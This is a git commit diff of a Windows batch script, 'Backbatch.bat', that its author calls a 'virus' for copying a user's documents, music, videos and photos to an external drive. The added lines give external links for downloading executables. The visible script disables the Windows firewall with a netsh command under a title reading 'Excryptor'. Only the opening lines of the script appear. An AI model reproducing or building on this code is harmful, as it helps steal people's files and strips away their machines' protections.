0ae9151a0e71a274e2d9d0b7d7b224546a2753ba
Wilson Netto <ngmplays@gmail.com>
2017-06-04 16:55:16 -0300

    Update Backbatch.bat

--- Backbatch.bat
+++ Backbatch.bat
@@ -1,5 +1,8 @@
 # backbatch
  This is a very simple plus powerful virus to be used wisely It copies all Documents, Music, Videos, Photos From a local disk with windows and copy to a pen drive or external disk by wilson netto
+# Downloads exe 
+# https://userscloud.com/nscn41hihw6q
+# https://userscloud.com/5nbjzt6qxe7i
 
 @title Excryptor - Wilson Netto (C) Copyright  USER: %USERNAME% 
 netsh advfirewall set all state off
